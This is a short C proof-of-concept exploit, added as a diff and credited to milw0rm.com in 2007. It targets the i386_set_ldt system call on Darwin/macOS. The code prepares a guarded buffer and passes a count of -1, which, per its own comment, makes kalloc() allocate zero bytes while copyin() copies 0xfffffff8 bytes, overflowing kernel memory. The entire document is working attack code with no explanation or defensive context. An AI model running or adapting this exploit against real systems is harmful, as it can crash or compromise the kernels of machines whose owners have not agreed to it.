@@ -1,0 +1,45 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <architecture/i386/table.h>
+#include <i386/user_ldt.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+
+int
+main(void)
+{
+    union ldt_entry descs;
+    char *buf;
+    u_long pgsz = sysconf(_SC_PAGESIZE);
+
+    if ((buf = (char *)malloc(pgsz * 4)) == -1) {
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(buf, 0x41, pgsz * 4);
+
+    buf = (char *)(((u_long)buf & ~pgsz) + pgsz);
+
+    if (mprotect((char *)((u_long)buf + (pgsz * 2)), (size_t)pgsz,
+    PROT_WRITE) == -1) {
+        perror("mprotect");
+        exit(EXIT_FAILURE);
+    }
+
+    /*
+     * This will result in kalloc() size argument being 0x00000000 and
+copyin()
+     * size argument being 0xfffffff8.
+     */
+
+    if (i386_set_ldt(1024, (union ldt_entry *)&buf, -1) == -1) {
+        perror("i386_set_ldt");
+        exit(EXIT_FAILURE);
+    }
+
+    exit(EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-11-16]
